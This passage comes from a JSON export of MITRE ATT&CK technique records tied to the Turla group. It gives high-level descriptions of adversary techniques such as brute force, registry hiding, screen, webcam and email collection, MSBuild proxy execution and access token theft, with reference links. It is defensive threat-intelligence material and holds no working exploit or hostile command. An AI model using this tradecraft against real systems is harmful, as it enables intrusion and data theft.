        "description": "Apple. (2015, September 16). Cocoa Application Layer. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Core Services",
        "url": "https://developer.apple.com/documentation/coreservices",
        "description": "Apple. (n.d.). Core Services. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "macOS Foundation",
        "url": "https://developer.apple.com/documentation/foundation",
        "description": "Apple. (n.d.). Foundation. Retrieved July 1, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "OutFlank System Calls",
        "url": "https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/",
        "description": "de Plaa, C. (2019, June 19). Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR. Retrieved September 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Fork",
        "url": "https://www.gnu.org/software/libc/manual/html_node/Creating-a-Process.html",
        "description": "Free Software Foundation, Inc.. (2020, June 18). Creating a Process. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "CyberBit System Calls",
        "url": "https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/",
        "description": "Gavriel, H. (2018, November 27). Malware Mitigation when Direct System Calls are Used. Retrieved September 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "GLIBC",
        "url": "https://www.gnu.org/software/libc/",
        "description": "glibc developer community. (2020, February 1). The GNU C Library (glibc). Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "LIBC",
        "url": "https://man7.org/linux/man-pages//man7/libc.7.html",
        "description": "Kerrisk, M. (2016, December 12). libc(7) — Linux manual page. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Kernel API",
        "url": "https://www.kernel.org/doc/html/v4.12/core-api/kernel-api.html",
        "description": "Linux Kernel Organization, Inc. (n.d.). The Linux Kernel API. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "MDSec System Calls",
        "url": "https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/",
        "description": "MDSec Research. (2020, December). Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams. Retrieved September 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft CreateProcess",
        "url": "http://msdn.microsoft.com/en-us/library/ms682425",
        "description": "Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Win32",
        "url": "https://docs.microsoft.com/en-us/windows/win32/api/",
        "description": "Microsoft. (n.d.). Programming reference for the Win32 API. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft NET",
        "url": "https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet-framework",
        "description": "Microsoft. (n.d.). What is .NET Framework?. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "NT API Windows",
        "url": "https://undocumented.ntinternals.net/",
        "description": "The NTinterlnals.net team. (n.d.). Nowak, T. Retrieved June 25, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd",
    "platform": "windows|azure-ad|office-365|saas|iaas|linux|macos|google-workspace|containers|network",
    "tid": "T1110",
    "technique": "Brute Force",
    "tactic": "credential-access",
    "datasources": "application-log-content|command-execution|user-account-authentication",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1110.003",
      "T1110.004"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/49.html",
        "description": "none",
        "external_id": "CAPEC-49"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
    "platform": "windows",
    "tid": "T1112",
    "technique": "Modify Registry",
    "tactic": "defense-evasion",
    "datasources": "command-execution|os-api-execution|process-creation|windows-registry-key-creation|windows-registry-key-deletion|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "comrat|hyperstack|mosquito|tinyturla",
    "correlation_tool": "reg",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/203.html",
        "description": "none",
        "external_id": "CAPEC-203"
      },
      {
        "source_name": "Microsoft Reg",
        "url": "https://technet.microsoft.com/en-us/library/cc732643.aspx",
        "description": "Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Reghide NOV 2006",
        "url": "https://docs.microsoft.com/sysinternals/downloads/reghide",
        "description": "Russinovich, M. & Sharkey, K. (2006, January 10). Reghide. Retrieved August 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro POWELIKS AUG 2014",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/",
        "description": "Santos, R. (2014, August 1). POWELIKS: Malware Hides In Windows Registry. Retrieved August 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SpectorOps Hiding Reg Jul 2017",
        "url": "https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353",
        "description": "Reitz, B. (2017, July 14). Hiding Registry keys with PSReflect. Retrieved August 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Remote",
        "url": "https://technet.microsoft.com/en-us/library/cc754820.aspx",
        "description": "Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft 4657 APR 2017",
        "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657",
        "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4657(S): A registry value was modified. Retrieved August 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft RegDelNull July 2016",
        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull",
        "description": "Russinovich, M. & Sharkey, K. (2016, July 4). RegDelNull v1.11. Retrieved August 10, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688",
    "platform": "linux|macos|windows",
    "tid": "T1113",
    "technique": "Screen Capture",
    "tactic": "collection",
    "datasources": "command-execution|os-api-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "kazuar",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/648.html",
        "description": "none",
        "external_id": "CAPEC-648"
      },
      {
        "source_name": "CopyFromScreen .NET",
        "url": "https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen?view=netframework-4.8",
        "description": "Microsoft. (n.d.). Graphics.CopyFromScreen Method. Retrieved March 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Antiquated Mac Malware",
        "url": "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
        "description": "Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004",
    "platform": "windows",
    "tid": "T1114.001",
    "technique": "Local Email Collection",
    "tactic": "collection",
    "datasources": "command-execution|file-access",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.(Citation: Microsoft Outlook Files)",
    "technique_references": [
      {
        "source_name": "Outlook File Sizes",
        "url": "https://practical365.com/clients/office-365-proplus/outlook-cached-mode-ost-file-sizes/",
        "description": "N. O'Bryan. (2018, May 30). Managing Outlook Cached Mode and OST File Sizes. Retrieved February 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Outlook Files",
        "url": "https://support.office.com/en-us/article/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790",
        "description": "Microsoft. (n.d.). Introduction to Outlook Data Files (.pst and .ost). Retrieved February 19, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a",
    "platform": "office-365|windows|google-workspace",
    "tid": "T1114.002",
    "technique": "Remote Email Collection",
    "tactic": "collection",
    "datasources": "command-execution|logon-session-creation|network-connection-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "lightneuron",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.",
    "technique_references": [],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f",
    "platform": "linux|windows|macos",
    "tid": "T1115",
    "technique": "Clipboard Data",
    "tactic": "collection",
    "datasources": "command-execution|os-api-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nIn Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/637.html",
        "description": "none",
        "external_id": "CAPEC-637"
      },
      {
        "source_name": "MSDN Clipboard",
        "url": "https://msdn.microsoft.com/en-us/library/ms649012",
        "description": "Microsoft. (n.d.). About the Clipboard. Retrieved March 29, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Operating with EmPyre",
        "url": "https://medium.com/rvrsh3ll/operating-with-empyre-ea764eda3363",
        "description": "rvrsh3ll. (2016, May 18). Operating with EmPyre. Retrieved July 12, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643",
    "platform": "windows|macos|linux",
    "tid": "T1120",
    "technique": "Peripheral Device Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "crutch",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/646.html",
        "description": "none",
        "external_id": "CAPEC-646"
      },
      {
        "source_name": "Peripheral Discovery Linux",
        "url": "https://linuxhint.com/list-usb-devices-linux/",
        "description": "Shahriar Shovon. (2018, March). List USB Devices Linux. Retrieved March 11, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Peripheral Discovery macOS",
        "url": "https://ss64.com/osx/system_profiler.html",
        "description": "SS64. (n.d.). system_profiler. Retrieved March 11, 2022.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077",
    "platform": "windows",
    "tid": "T1124",
    "technique": "System Time Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|epic",
    "correlation_tool": "net",
    "correlation_gid": "G0010",
    "technique_description": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service)\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/295.html",
        "description": "none",
        "external_id": "CAPEC-295"
      },
      {
        "source_name": "MSDN System Time",
        "url": "https://msdn.microsoft.com/ms724961.aspx",
        "description": "Microsoft. (n.d.). System Time. Retrieved November 25, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Technet Windows Time Service",
        "url": "https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings",
        "description": "Mathers, B. (2016, September 30). Windows Time Service Tools and Settings. Retrieved November 25, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "RSA EU12 They're Inside",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-209_rivner_schwartz.pdf",
        "description": "Rivner, U., Schwartz, E. (2012). They’re Inside… Now What?. Retrieved November 25, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "AnyRun TimeBomb",
        "url": "https://any.run/cybersecurity-blog/time-bombs-malware-with-delayed-execution/",
        "description": "Malicious History. (2020, September 17). Time Bombs: Malware With Delayed Execution. Retrieved April 22, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf",
    "platform": "windows|macos|linux",
    "tid": "T1125",
    "technique": "Video Capture",
    "tactic": "collection",
    "datasources": "command-execution|os-api-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "kazuar",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/634.html",
        "description": "none",
        "external_id": "CAPEC-634"
      },
      {
        "source_name": "objective-see 2017 review",
        "url": "https://objective-see.com/blog/blog_0x25.html",
        "description": "Patrick Wardle. (n.d.). Retrieved March 20, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--c92e3d68-2349-49e4-a341-7edca2deff96",
    "platform": "windows",
    "tid": "T1127.001",
    "technique": "MSBuild",
    "tactic": "defense-evasion",
    "datasources": "command-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)",
    "technique_references": [
      {
        "source_name": "MSDN MSBuild",
        "url": "https://msdn.microsoft.com/library/dd393574.aspx",
        "description": "Microsoft. (n.d.). MSBuild1. Retrieved November 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft MSBuild Inline Tasks 2017",
        "url": "https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-inline-tasks?view=vs-2019#code-element",
        "description": "Microsoft. (2017, September 21). MSBuild inline tasks. Retrieved March 5, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Msbuild",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/",
        "description": "LOLBAS. (n.d.). Msbuild.exe. Retrieved July 31, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c",
    "platform": "linux|macos|windows",
    "tid": "T1132.001",
    "technique": "Standard Encoding",
    "tactic": "command-and-control",
    "datasources": "network-traffic-content",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "kazuar",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
    "technique_references": [
      {
        "source_name": "Wikipedia Binary-to-text Encoding",
        "url": "https://en.wikipedia.org/wiki/Binary-to-text_encoding",
        "description": "Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Character Encoding",
        "url": "https://en.wikipedia.org/wiki/Character_encoding",
        "description": "Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
    "platform": "windows",
    "tid": "T1134",
    "technique": "Access Token Manipulation",
    "tactic": "defense-evasion",
    "datasources": "active-directory-object-modification|command-execution|os-api-execution|process-creation|process-metadata|user-account-metadata",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1134.001",
      "T1134.002",
      "T1134.003",
      "T1134.005"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
    "technique_references": [
      {
        "source_name": "BlackHat Atkinson Winchester Token Manipulation",
        "url": "https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf",
        "description": "Atkinson, J., Winchester, R. (2017, December 7). A Process is No One: Hunting for Token Manipulation. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Command-line Logging",
        "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
        "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft LogonUser",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DuplicateTokenEx",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft ImpersonateLoggedOnUser",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Pentestlab Token Manipulation",
        "url": "https://pentestlab.blog/2017/04/03/token-manipulation/",
        "description": "netbiosX. (2017, April 3). Token Manipulation. Retrieved April 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/633.html",
        "description": "none",
        "external_id": "CAPEC-633"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
    "platform": "windows",
    "tid": "T1134",
    "technique": "Access Token Manipulation",
    "tactic": "privilege-escalation",
    "datasources": "active-directory-object-modification|command-execution|os-api-execution|process-creation|process-metadata|user-account-metadata",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1134.001",
      "T1134.002",
      "T1134.003",
      "T1134.005"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
    "technique_references": [
      {
        "source_name": "BlackHat Atkinson Winchester Token Manipulation",
        "url": "https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf",
        "description": "Atkinson, J., Winchester, R. (2017, December 7). A Process is No One: Hunting for Token Manipulation. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Command-line Logging",
        "url": "https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing",
        "description": "Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft LogonUser",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DuplicateTokenEx",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx",
        "description": "Microsoft TechNet. (n.d.). Retrieved April 25, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft ImpersonateLoggedOnUser",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx",
